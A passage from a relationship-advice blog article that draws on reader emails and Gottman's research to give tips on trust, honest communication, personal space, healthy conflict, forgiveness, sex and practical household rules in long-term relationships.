 trust. And trust is the lifeblood of any relationship (romantic or 
otherwise). Without trust, there can be no sense of intimacy or comfort.
 Without trust, your partner will become a liability in your mind, 
something to be avoided and analyzed, not a protective homebase for your
 heart and your mind.<br>
<h2>
4. Talk Openly About Everything, Especially the Stuff That Hurts</h2>
<blockquote>
“We
 always talk about what’s bothering us with each other, not anyone else!
 We have so many friends who are in marriages that are not working well 
and they tell me all about what is wrong. I can’t help them, they need 
to be talking to their spouse about this, that’s the only person who can
 help them figure it out. If you can figure out a way to be able to 
always talk with your spouse about what’s bugging you then you can work 
on the issue.”<br>
– Ronnie</blockquote>
<blockquote>
“There can be no secrets. Secrets divide you. Always.”<br>
– Tracey</blockquote>
I receive hundreds of emails from readers each week <a href="https://markmanson.net/risk">asking for life advice</a>. A large percentage of these emails involve their struggling romantic relationships.<br>
(These emails, too, are surprisingly repetitive.)<br>
A
 couple years ago, I discovered that I was answering the vast majority 
of these relationship emails with the exact same response.<br>
“Take this email you just sent to me, print it out, and show it to your partner. Then come back and ask again.”<br>
This response became so common that I actually put it on my <a href="https://markmanson.net/contact">contact form</a> on the site because I was so tired of copying and pasting it.<br>
If
 something bothers you in the relationship, you must be willing to say 
it. Saying it builds trust and trust builds intimacy. It may hurt, but 
you still need to do it. No one else can fix your relationship for you. 
Nor should anyone else. Just as causing pain to your muscles allows them
 to grow back stronger, often introducing some pain into your 
relationship <a href="https://markmanson.net/vulnerability">through vulnerability</a> is the only way to make the relationship stronger.<br>
Behind
 respect, trust was the most commonly mentioned trait for a healthy 
relationship. Most people mentioned it in the context of <a href="https://markmanson.net/why-people-cheat">jealousy and fidelity</a> — trust your partner to go off on their own, don’t get insecure or angry if you see them talking with someone else, etc.<br>
But
 trust goes much deeper than that. Because when you’re really talking 
about the long-haul, you start to get into some serious life-or-death 
shit. If you ended up with cancer tomorrow, would you trust your partner
 to stick with you and take care of you? Would you trust your partner to
 care for your child for a week by themselves? Do you trust them to 
handle your money or make sound decisions under pressure? Do you trust 
them to not turn on you or blame you when you make mistakes?<br>
These
 are hard things to do. And they’re even harder to think about early on 
in a relationship. Trust at the beginning of a relationship is easy. 
It’s like, “Oh, I forgot my phone at her apartment, I trust her not to 
sell it and buy crack with the money… I think.”<br>
But the deeper the
 commitment, the more intertwined your lives become, and the more you 
will have to trust your partner to act in your interest in your absence.<br>
There’s
 an old Ben Folds song where he sings, “It seems to me if you cannot 
trust, you cannot be trusted.” Distrust has a tendency to breed 
distrust. If your partner is always snooping through your stuff, 
accusing you of doing things you didn’t do, and questioning all of your 
decisions, naturally, you will start to question their intentions as 
well — Why is she so insecure? What if she is hiding something herself?<br>
The key to fostering and maintaining trust in the relationship is for both partners to be completely transparent and vulnerable:<br>
<ul>
<li>If
 something is bothering you, say something. This is important not only 
for addressing issues as they arise, but it proves to your partner that 
you have nothing to hide.</li>
<li>Those icky, insecure things you hate 
sharing with people? Share them with your partner. Not only is it 
healing, but you and your partner need to have a good understanding of 
each other’s insecurities and the way you each choose to compensate for 
them.</li>
<li>Make promises and then <em>stick to them</em>. The only 
way to truly rebuild trust after it’s been broken is through a proven 
track record over time. You cannot build that track record until you own
 up to previous mistakes and set about correcting them.</li>
<li>Learn to
 discern your partner’s own shady behavior from your own insecurities 
(and vice-versa). This is hard and will likely require confrontation to 
get to the bottom of. But in most relationship fights, one person thinks
 something is completely “normal” and the other thinks it’s really 
grade-A “fucked up.” It’s often extremely hard to distinguish who is 
being irrational and insecure and who is being reasonable and merely 
standing up for themselves. Be patient in rooting out what’s what, and 
when it’s your big, gnarly insecurity (and sometimes it will be, trust 
me), be honest about it. Own up to it. And strive to be better.</li>
</ul>
Trust
 is like a china plate. If you drop it and it breaks, you can put it 
back together with a lot of work and care. If you drop it and break it a
 second time, it will split into twice as many pieces and it will 
require far more time and care to put back together again. But drop and 
break it enough times, and it will shatter into so many pieces that you 
will never be able to put it back together again, no matter what you do.<br>
<h2>
5. A Healthy Relationship Means Two Healthy Individuals</h2>
<blockquote>
“Understand
 that it is up to you to make yourself happy, it is NOT the job of your 
spouse. I am not saying you shouldn’t do nice things for each other, or 
that your partner can’t make you happy sometimes. I am just saying don’t
 lay expectations on your partner to “make you happy.” It is not their 
responsibility. Figure out as individuals what makes you happy as an 
individual, be happy yourself, then you each bring that to the 
relationship.”<br>
– Mandy</blockquote>
A lot is made about 
“sacrifices” in a relationship. You are supposed to keep the 
relationship happy by consistently sacrificing yourself for your partner
 and their wants and needs.<br>
There is some truth to that. Every relationship requires each person to consciously choose to give something up at times.<br>
But the problem is when <em>all of the relationship’s happiness</em>
 is contingent on the other person and both people are in a constant 
state of sacrifice. Just read that again. That sounds horrible. It 
reminds me of an old Marilyn Manson song, “Shoot myself to love you; if I
 loved myself, I’d be shooting you.” A relationship based on sacrifices 
cannot be sustained, and will eventually become damaging to both 
individuals in it.<br>
<blockquote>
“Shitty, codependent relationships 
have an inherent stability because you’re both locked in an implicit 
bargain to tolerate the other person’s bad behavior because they’re 
tolerating yours, and neither of you wants to be alone. On the surface, 
it seems like “compromising in relationships because that’s what people 
do,” but the reality is that resentments build up, and both parties 
become the other person’s emotional hostage against having to face and 
deal with their own bullshit (it took me 14 years to realize this, by 
the way).”<br>
– Karen</blockquote>
A healthy and happy relationship requires <a href="https://markmanson.net/amazing-person">two healthy and happy individuals</a>. Keyword here: “individuals.” That means two people with their <em>own</em> <a href="https://markmanson.net/diversify-your-identity">identities</a>, their <em>own</em> interests and perspectives, and things they do by themselves, on their <em>own</em> time.<br>
This
 is why attempting to control your partner (or submitting control over 
yourself to your partner) to make them “happy” ultimately backfires — it
 allows the individual identities of each person to be destroyed, the 
very identities that attracted each person and brought them together in 
the first place.<br>
<blockquote>
“Don’t try to change them. This is the person you chose. They were good enough to marry so don’t expect them to change now.”<br>
– Allison</blockquote>
<blockquote>
“Don’t
 ever give up who you are for the person you’re with. It will only 
backfire and make you both miserable. Have the courage to be who you 
are, and most importantly, let your partner be who they are. Those are 
the two people who fell in love with each other in the first place.”<br>
– Dave</blockquote>
But
 how does one do this? Well, it’s a bit counterintuitive. But it’s 
something hundreds and hundreds of successful couples echoed in their 
emails…<br>
<h2>
6. Give Each Other Space</h2>
<blockquote>
“Be sure you 
have a life of your own, otherwise it is harder to have a life together.
 What do I mean? Have your own interests, your own friends, your own 
support network, and your own hobbies. Overlap where you can, but not 
being identical should give you something to talk about and expose one 
another to. It helps to expand your horizons as a couple, but isn’t so 
boring as both living the exact same life.”<br>
– Anonymous</blockquote>
Among the emails, one of the most popular themes was the importance of creating space and separation from one another.<br>
People
 sung the praises of separate checking accounts, separate credit cards, 
having different friends and hobbies, taking separate vacations from one
 another each year (this has been a big one in my own relationship). 
Some even went so far as to recommend separate bathrooms or even 
separate bedrooms.<br>
Some people are afraid to give their partner 
freedom and independence. This comes from a lack of trust and/or 
insecurity that if we give our partner too much space, they will 
discover they don’t want to be with us anymore. Generally, the more 
uncomfortable we are with our own worthiness in the relationship and to 
be loved, the more we will try to control the relationship and our 
partner’s behaviors.<br>
BUT, more importantly, this inability to let our partners <em>be who they are</em>,
 is a subtle form of disrespect. After all, if you can’t trust your 
husband to have a simple golfing trip with his buddies, or you’re afraid
 to let your wife go out for drinks after work, what does that say about
 your respect for their ability to handle themselves well? What does it 
say for your respect <em>for yourself</em>? I mean, after all, if you 
believe a couple after-work drinks is enough to steer your girlfriend 
away from you, you clearly don’t think too highly of yourself.<br>
<blockquote>
“Going
 on seventeen years. If you love your partner enough you will let them 
be who they are, you don’t own them, who they hang with, what they do or
 how they feel. Drives me nuts when I see women not let their husbands 
go out with the guys or are jealous of other women.”<br>
– Natalie</blockquote>
<h2>
7. You and Your Partner Will Grow and Change in Unexpected Ways; Embrace It</h2>
<blockquote>
“Over
 the course of 20 years we both have changed tremendously. We have 
changed faiths, political parties, numerous hair colors and styles, but 
we love each other and possibly even more. Our grown kids constantly 
tell their friends what hopeless romantics we are. And the biggest thing
 that keeps us strong is not giving a fuck about what anyone else says 
about our relationship.”<br>
– Dotti</blockquote>
One theme that
 came up repeatedly, especially with those married 20+ years, was how 
much each individual changes as the decades roll on, and how ready each 
of you have to be to embrace the other partner as these changes occur. 
One reader commented that at her wedding, an elderly family member told 
her, “One day many years from now, you will wake up and your spouse will
 be a different person, make sure you fall in love with that person 
too.”<br>
It logically follows that if there is a bedrock of respect 
for each individual’s interests and values underpinning the 
relationship, and each individual is encouraged to foster their own 
growth and development, that each person will, as time goes on, evolve 
in different and unexpected ways. It’s then up to the couple to 
communicate and make sure that they are consistently a) aware of the 
changes going on in their partner, and b) continually accepting and 
respecting those changes as they occur.<br>
Now, you’re probably 
reading this and thinking, “Sure, Bill likes sausage now, but in a few 
years he might prefer steak. I can get on board with that.”<br>
No, 
I’m talking some pretty serious life changes. Remember, if you’re going 
to spend decades together, some really heavy shit will hit (and break) 
the fan. Among <a href="https://markmanson.net/four-stages-of-life">major life changes</a>
 people told me their marriages went through (and survived): changing 
religions, moving countries, death of family members (including 
children), supporting elderly family members, changing political 
beliefs, even changing sexual orientation and in a couple cases, gender 
identification.<br>
<div class="RIL_image" id="RIL_IMG_3">
<img class="article_image deferred" height="132" id="image_3" width="200" data-src="https://pocket-image-cache.com/direct?resize=w2000&amp;url=https%3A%2F%2Fmarkmanson.net%2Fwp-content%2Fuploads%2F2016%2F12%2Folder-couple-walking-relationship-advice-780x518.jpg" src="data:image/gif;base64,R0lGODlhAQABAPAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="></div>
Amazingly,
 these couples survived because their respect for each other allowed 
them to adapt and allow each person to continue to flourish and grow.<br>
<blockquote>
“When
 you commit to someone, you don’t actually know who you’re committing 
to. You know who they are today, but you have no idea who this person is
 going to be in five years, ten years, and so on. You have to be 
prepared for the unexpected, and truly ask yourself if you admire this 
person regardless of the superficial (or not-so-superficial) details, 
because I promise almost all of them at some point are going to either 
change or go away.”<br>
– Michael</blockquote>
But this isn’t easy, of course. In fact, at times, it will be downright soul-destroying.<br>
Which is why you need to make sure you and your partner know how to fight.<br>
<h2>
8. Get Good at Fighting</h2>
<blockquote>
“The
 relationship is a living, breathing thing. Much like the body and 
muscles, it cannot get stronger without stress and challenge. You have 
to fight. You have to hash things out. Obstacles make the marriage.”<br>
Ryan Saplan</blockquote>
John
 Gottman is a hot-shit psychologist and researcher who has spent over 30
 years analyzing married couples and looking for keys to why they stick 
together and <a href="https://markmanson.net/how-to-break-up-with-someone">why they break up</a>.
 Chances are, if you’ve read any relationship advice article before, 
you’ve either directly or indirectly been exposed to his work. When it 
comes to, <a href="https://amzn.to/2gbZ2BF">“Why do people stick together?”</a> he dominates the field.<br>
What Gottman does is he gets married couples in a room, puts some cameras on them, and then he asks them to have a fight.<br>
Notice:
 he doesn’t ask them to talk about how great the other person is. He 
doesn’t ask them what they like best about their relationship.<br>
He asks them to fight. Pick something they’re having problems with and talk about it for the camera.<br>
And
 from simply analyzing the film for the couple’s discussion (or shouting
 match, whatever), he’s able to predict with startling accuracy whether a
 couple will divorce or not.<br>
But what’s most interesting about 
Gottman’s research is that the things that lead to divorce are not 
necessarily what you think. Successful couples, like unsuccessful 
couples, he found, fight consistently. And some of them fight furiously.<br>
He
 has been able to narrow down four characteristics of a couple that tend
 to lead to divorces (or breakups). He has gone on and called these “the
 four horsemen” of the relationship apocalypse in his books. They are:<br>
<ol>
<li>Criticizing your partner’s character (“You’re so stupid” vs “That thing you did was stupid.”)</li>
<li>Defensiveness (or basically, blame shifting, “I wouldn’t have done that if you weren’t late all the time.”)</li>
<li>Contempt (putting down your partner and making them feel inferior.)</li>
<li>Stonewalling (withdrawing from an argument and ignoring your partner.)</li>
</ol>
The reader emails back this up as well. Out of the 1,500-some-odd emails, <em>almost every single one referenced the importance of dealing with conflicts well</em>.<br>
Advice given by readers included:<br>
<ul>
<li>Never
 insult or name-call your partner. Put another way: hate the sin, love 
the sinner. Gottman’s research found that “contempt” — belittling and 
demeaning your partner — is the number one predictor of divorce.</li>
<li>Do
 not bring previous fights/arguments into current ones. This solves 
nothing and just makes the fight twice as bad as it was before. Yeah, 
you forgot to pick up groceries on the way home, but what does him being
 rude to your mother last Thanksgiving have to do with anything?</li>
<li>If
 things get too heated, take a breather. Remove yourself from the 
situation and come back once emotions have cooled off a bit. This is a 
big one for me personally, sometimes when things get intense with my 
wife, I get overwhelmed and just leave for a while. I usually walk 
around the block 2-3 times and let myself seeth for about 15 minutes. 
Then I come back and we’re both a bit calmer and we can resume the 
discussion with a much more conciliatory tone.</li>
<li>Remember that 
being “right” is not as important as both people feeling respected and 
heard. You may be right, but if you are right in such a way that makes 
your partner feel unloved, then there’s no real winner.</li>
</ul>
But all of this takes for granted another important point: be willing to fight in the first place.<br>
I
 think when people talk about the necessity for “good communication” all
 of the time (a vague piece of advice that everyone says but few people 
seem to actually clarify what it means), this is what they mean: be 
willing to have the uncomfortable talks. Be willing to have the fights. 
Say the ugly things and get it all out in the open.<br>
This was a constant theme from the divorced readers. Dozens (hundreds?) of them had more or less the same sad story to tell:<br>
<blockquote>
“But
 there’s no way on God’s Green Earth this is her fault alone. There were
 times when I saw huge red flags. Instead of trying to figure out what 
in the world was wrong, I just plowed ahead. I’d buy more flowers, or 
candy, or do more chores around the house. I was a “good” husband in 
every sense of the word. But what I wasn’t doing was paying attention to
 the right things. She wasn’t telling me there wasn’t a problem but 
there was. And instead of saying something, I ignored all of the 
signals.”<br>
– Jim</blockquote>
<h2>
9. Get Good at Forgiving</h2>
<blockquote>
“When
 you end up being right about something – shut up. You can be right and 
be quiet at the same time. Your partner will already know you’re right 
and will feel loved knowing that you didn’t wield it like a bastard 
sword.”<br>
– Brian</blockquote>
<blockquote>
“In marriage, there’s no such thing as winning an argument.”<br>
– Bill</blockquote>
To
 me, perhaps the most interesting nugget from Gottman’s research is the 
fact that most successful couples don’t actually resolve all of their 
problems. In fact, his findings were <a href="https://markmanson.net/6-healthy-habits">completely backwards from what most people actually expect</a>:
 people in lasting and happy relationships have problems that never 
completely go away, while couples that feel as though they need to agree
 and compromise on everything end up feeling miserable and falling 
apart.<br>
To me, like everything else, this comes back to the respect
 thing. If you have two different individuals sharing a life together, 
it’s inevitable that they will have different values and perspectives on
 some things and clash over it. The key here is not changing the other 
person — as the desire to change your partner is inherently 
disrespectful (to both them and yourself) — but rather it’s to simply 
abide by the difference, love them despite it, and when things get a 
little rough around the edges, to forgive them for it.<br>
<blockquote>
“Everyone
 says that compromise is key, but that’s not how my husband and I see 
it. It’s more about seeking understanding. Compromise is bullshit, 
because it leaves both sides unsatisfied, losing little pieces of 
themselves in an effort to get along. On the other hand, refusing to 
compromise is just as much of a disaster, because you turn your partner 
into a competitor (“I win, you lose”). These are the wrong goals, 
because they’re outcome-based rather than process-based. When your goal 
is to find out where your partner is coming from – to truly understand 
on a deep level – you can’t help but be altered by the process. Conflict
 becomes much easier to navigate because you see more of the context.”<br>
– Michelle</blockquote>
I’ve written for years that the <a href="https://markmanson.net/stop-trying-to-be-happy">key to happiness</a> is not achieving your <a href="https://markmanson.net/dreams">lofty dreams</a>, or experiencing some dizzying high, but rather <a href="https://markmanson.net/find-what-you-love">finding the struggles and challenges that you enjoy enduring</a>.<br>
A
 similar concept seems to be true in relationships: your perfect partner
 is not someone who creates no problems in the relationship, rather your
 perfect partner is someone who creates problems in the relationship 
that you feel good about dealing with.<br>
But how do you get good at forgiving? What does that actually mean? Again, some advice from the readers:<br>
<ul>
<li>When
 an argument is over, it’s over. Some couples went as far as to make 
this the golden rule in their relationship. When you’re done fighting, 
it doesn’t matter who was right and who was wrong, it doesn’t matter if 
someone was mean and someone was nice. It’s over. It’s in the past. And 
you both agree to leave it there, not bring it up every month for the 
next three years.</li>
<li>There’s no scoreboard. No one is trying to 
“win” here. There’s no, “You owe me this because you screwed up the 
laundry last week.” There’s no, “I’m always right about financial stuff,
 so you should listen to me.” There’s no, “I bought her three gifts and 
she only did me one favor.” Everything in the relationship is given and 
done unconditionally — that is: without expectation or manipulation.</li>
<li>When
 your partner screws up, you separate the intentions from the behavior. 
You recognize the things you love and admire in your partner and 
understand that he/she was simply doing the best that they could, yet 
messed up out of ignorance. Not because they’re a bad person. Not 
because they secretly hate you and want to divorce you. Not because 
there’s somebody else in the background pulling them away from you. They
 are a good person. That’s why you are with them. If you ever lose your 
faith in that, then you will begin to erode your faith in yourself.</li>
</ul>
And finally, pick your battles wisely. You and your partner only have <a href="https://markmanson.net/not-giving-a-fuck">so many fucks to give</a>, make sure you both are saving them for the real things that matter.<br>
<blockquote>
“Been
 happily married 40+ years. One piece of advice that comes to mind: 
choose your battles. Some things matter, worth getting upset about. Most
 do not. Argue over the little things and you’ll find yourself arguing 
endlessly; little things pop up all day long, it takes a toll over time.
 Like Chinese water torture: minor in the short term, corrosive over 
time. Consider: is this a little thing or a big thing? Is it worth the 
cost of arguing?”<br>
– Fred</blockquote>
<h2>
10. The Little Things Add Up to Big Things</h2>
<blockquote>
“If
 you don’t take the time to meet for lunch, go for a walk or go out to 
dinner and a movie with some regularity then you basically end up with a
 roommate. Staying connected through life’s ups and downs is critical. 
Eventually your kids grow up, your obnoxious brother-in-law will join a 
monastery and your parents will die. When that happens, guess who’s 
left? You got it… Mr./Mrs. Right! You don’t want to wake up 20 years 
later and be staring at a stranger because life broke the bonds you 
formed before the shitstorm started. You and your partner need to be the
 eye of the hurricane.”<br>
– Brian</blockquote>
Of the 1,500 
responses I got, I’d say about ½ of them mentioned at some point or 
another one simple but effective piece of advice: Don’t ever stop doing 
the little things. They add up.<br>
Things as simple as saying, “I 
love you,” before going to bed, holding hands during a movie, doing 
small favors here and there, helping with some household chores. Even 
cleaning up when you accidentally pee on the toilet seat (seriously, 
someone said that) — these things all matter and add up over the long 
run.<br>
The same way Fred, married for 40+ years, stated above that 
arguing over small things consistently wears you both down, “like 
Chinese water torture,” so do the little favors and displays of 
affection add up. Don’t lose them.<br>
This seems to become 
particularly important once kids enter the picture. The big message I 
heard hundreds of times about kids: put the marriage first.<br>
<blockquote>
“Children
 are worshipped in our culture these days. Parents are expected to 
sacrifice everything for them. But the best way to raise healthy and 
happy kids is to maintain a healthy and happy marriage. Good kids don’t 
make a good marriage. A good marriage makes good kids. So keep your 
marriage the top priority.”<br>

Readers
 implored to maintain regular “date nights,” to plan weekend getaways 
and to make time for sex, even when you’re tired, even when you’re 
stressed and exhausted and the baby is crying, even when junior has 
soccer practice at 5:30AM the next day. Make time for it. It’s worth it.<br>
Oh, and speaking of sex…<br>
<h2>
11. Sex Matters… A Lot.</h2>
<blockquote>
“And you know how you know if you or her are slipping? Sex starts to slide. Period. No other test required.”<br>
– Anonymous</blockquote>
I
 still remember back in college, it was one of my first relationships 
with a cute little redhead. We were young and naive and crazy about each
 other. And, because we happened to live in the same dorm, we were 
banging like rabbits.<br>
It was everything a 19-year-old male could ask for.<br>
Then
 after a month or two, we hit our first “rough patch” in the 
relationship. We fought more often, found ourselves getting annoyed with
 each other, and suddenly our multiple-times-per-day habit magically 
dried up. And it wasn’t just with her, but with me. To my surprised 
adolescent male mind, it was actually possible to have sex available to 
you yet not want it.<br>
It was almost, like, sex was connected to emotions. For a dumb 19-year-old, this was a complete shocker.<br>
That
 was the first time I discovered a truth about relationships: sex is the
 State of the Union. If the relationship is good, the sex will be good. 
You both will be wanting it and enjoying it. When the relationship is 
bad — when there are unresolved problems and unaddressed negative 
emotions — then the sex will often be the first thing to go out the 
window.<br>
This was reiterated to me hundreds of times in the emails.
 The nature of the sex itself varied quite a bit among couples — some 
couples take sexual experimentation seriously, others are staunch 
believers in frequency, others get way into fantasies — but the 
underlying principle was the same everywhere: both partners should be 
sexually satisfied as often as possible.<br>
But sex not only keeps 
the relationship healthy, many readers suggested that they use it to 
heal their relationships. That when things are a bit frigid between them
 or that they have some problems going on, a lot of stress, or other 
issues (i.e., kids), they even go so far as to schedule sexy time for 
themselves. They say it’s important. And it’s worth it.<br>
A few 
people even said that when things start to feel stale in the 
relationship, they agree to have sex every day for a week. Then, as if 
by magic, by the next week, they feel great again.<br>
Cue the Marvin Gaye tunes:<br>
<h2>
12. Be Practical, and Create Relationship Rules</h2>
<blockquote>
“There
 is no 50/50 in housecleaning, child rearing, vacation planning, 
dishwasher emptying, gift buying, dinner making, money making, etc. The 
sooner everyone accepts that, the happier everyone is. We all have 
things we like to do and hate to do; we all have things we are good at 
and not so good at. TALK to your partner about those things when it 
comes to dividing and conquering all the crap that has to get done in 
life.”<br>
– Liz</blockquote>
Everyone has an image in their 
mind of how a relationship should work. Both people share 
responsibilities. Both people manage to finely balance their time 
together with the time for themselves. Both pursue engaging and 
invigorating interests on their own and then share the benefits 
together. Both take turns cleaning the toilet and blowing each other and
 cooking gourmet lasagna for the extended family at Thanksgiving 
(although not all at the same time).<br>
Then there’s how relationships actually work.<br>
Messy.
 Stressful. Miscommunication flying everywhere so that both of you feel 
as though you’re in a perpetual state of talking to a wall.<br>
The 
fact is relationships are imperfect, messy affairs. And it’s for the 
simple reason that they’re comprised of imperfect, messy people — people
 who want different things at different times in different ways and oh, 
they forgot to tell you? Well, maybe if you had been listening, asshole.<br>
The
 common theme of the advice here was be pragmatic. If the wife is a 
lawyer and spends 50 hours at the office every week, and the husband is 
an artist and can work from home most days, it makes more sense for him 
to handle most of the day-to-day parenting duties. If the wife’s 
standard of cleanliness looks like a <i>Home &amp; Garden</i> catalog, 
and the husband has gone six months without even noticing the light 
fixture hanging from the ceiling, then it makes sense that the wife 
handles more of the home cleaning duties.<br>
It’s economics 101: 
division of labor makes everyone better off. Figure out what you are 
each good at, what you each love/hate doing, and then arrange 
accordingly. My wife loves cleaning (no, seriously), but she hates 
smelly stuff. So guess who gets dishes and garbage duty? Me. Because I <a href="https://markmanson.net/not-giving-a-fuck">don’t give a fuck</a>.
 I’ll eat off the same plate seven times in a row. I couldn’t smell a 
dead rat even if it was sleeping under my pillow. I’ll toss garbage 
around all day. Here honey, let me get that for you.<br>
On top of 
that, many couples suggested laying out rules for the relationship. This
 sounds cheesy, but ultimately, it’s practical. To what degree will you 
share finances? How much debt will be taken on or paid off? How much can
 each person spend without consulting the other? What purchases should 
be done together or do you trust each other to do separately? How do you
 decide which vacations to go on?<br>
Have meetings about this stuff. 
Sure, it’s not sexy or cool, but it needs to get done. You’re sharing a 
life together and so you need to plan and account for each person’s 
needs and resources.<br>
One person even said that she and her husband
 have “annual reviews” every year. She immediately told me not to laugh,
 but that she was serious. They have annual reviews where they discuss 
everything that’s going on in the household that they like and don’t 
like and what they can do in the coming year to change it. This sort of 
stuff sounds lame but it’s what keeps couples in touch with what’s going
 on with each other. And because they always have their fingers on the 
pulse of each other’s needs, they’re more likely to grow together rather
 than grow apart.<br>
<h2>
13. Learn to Ride the Waves</h2>
<blockquote>
“I
 have been married for 44 years (4 children, 6 grandchildren). I think 
the most important thing that I have learned in those years is that the 
love you feel for each other is constantly changing. Sometimes you feel a
 deep love and satisfaction, other times you want nothing to do with 
your spouse; sometimes you laugh together, sometimes you’re screaming at
 each other. It’s like a roller-coaster ride, ups and downs all the 
time, but as you stay together long enough the downs become less severe 
and the ups are more loving and contented. So even if you feel like you 
could never love your partner any more, that can change, if you give it a
 chance. I think people give up too soon. You need to be the kind of 
person that you want your spouse to be. When you do that it makes a 
world of difference.”<br>
– Chris</blockquote>
Out of the 
hundreds of analogies I saw these past few weeks, one stuck with me. A 
nurse emailed saying that she used to work with a lot of geriatric 
patients. And one day she was talking to a man in his late-80s about 
marriage and why his had lasted so long. The man said something like, 
“relationships exist as waves, people need to learn how to ride them.” 
Upon asking him to explain, he said that, like the ocean, there are 
constant waves of emotion going on within a relationship, ups and downs —
 some waves last for hours, some last for months or even years. The key 
is understanding that few of those waves have anything to do with the 
quality of the relationship — people lose jobs, family members die, 
couples relocate, switch careers, make a lot of money, lose a lot of 
money. Your job as a committed partner is to simply ride the waves with 
the person you love, regardless of where they go. Because ultimately, 
none of these waves last. And you simply end up with each other.<br>
<blockquote>
“Two
 years ago, I suddenly began resenting my wife for any number of 
reasons. I felt as if we were floating along, doing a great job of 
co-existing and co-parenting, but not sustaining a real connection. It 
deteriorated to the point that I considered separating from her; 
however, whenever I gave the matter intense thought, I could not 
pinpoint a single issue that was a deal breaker. I knew her to be an 
amazing person, mother, and friend. I bit my tongue a lot and held out 
hope that the malaise would pass as suddenly as it had arrived. 
Fortunately, it did and I love her more than ever. So the final bit of 
wisdom is to afford your spouse the benefit of the doubt. If you have 
been happy for such a long period, that is the case for good reason. Be 
patient and focus on the many aspects of her that still exist that 
caused you to fall in love in the first place.”<br>
– Kevin</blockquote>
<hr>
I’d
 like to take a moment to thank all of the readers who took the time to 
write something and send it to me. As always, it was humbling to see all
 of the wisdom and life experience out there. There were many, many, 
many excellent responses, with kind, heartfelt advice. It was hard to 
choose the ones that ended up here, and in many cases, I could have put a
 dozen different quotes that said almost the exact same thing.<br>
Exercises
 like this always amaze me because when you ask thousands of people for 
advice on something, you expect to receive thousands of different 
answers. But <a href="https://markmanson.net/10-life-lessons-excel-30s">in both cases now</a>,
 the vast majority of the advice has largely been the same. It shows you
 how similar we really are. And how no matter how bad things may get, we
 are never as alone as we think.<br>
I would end this by summarizing 
the advice in one tidy section. But once again, a reader named Margo did
 it far better than I ever could. So we’ll end with Margo:<br>
<blockquote>
“You
 can work through anything as long as you are not destroying yourself or
 each other. That means emotionally, physically, financially or 
spiritually. Make nothing off limits to discuss. Never shame or mock 
each other for the things you do that make you happy. Write down why you
 fell in love and read it every year on your anniversary (or more 
often). Write love letters to each other often. Make each other first. 
When kids arrive, it will be easy to fall into a frenzy of making them 
the only focus of your life…do not forget the love that produced them. 
You must keep that love alive and strong to feed them love. Spouse comes
 first. Each of you will continue to grow. Bring the other one with you.
 Be the one that welcomes that growth. Don’t think that the other one 
will hold the relationship together. Both of you should assume it’s up 
to you so that you are both working on it. Be passionate about cleaning 
house, preparing meals and taking care of your home. This is required of
 everyone daily, make it fun and happy and do it together. Do not 
complain about your partner to anyone. Love them for who they are. Make 
love even when you are not in the mood. Trust each other. Give each 
other the benefit of the doubt always. Be transparent. Have nothing to 
hide. Be proud of each other. Have a life outside of each other, but 
share it through conversation. Pamper and adore each other. Go to 
counselling now before you need it so that you are both open to working 
on the relationship together. Disagree with respect to each other’s 
feelings. Be open to change and accepting of differences. Print this and
 refer to it daily.”</blockquote>
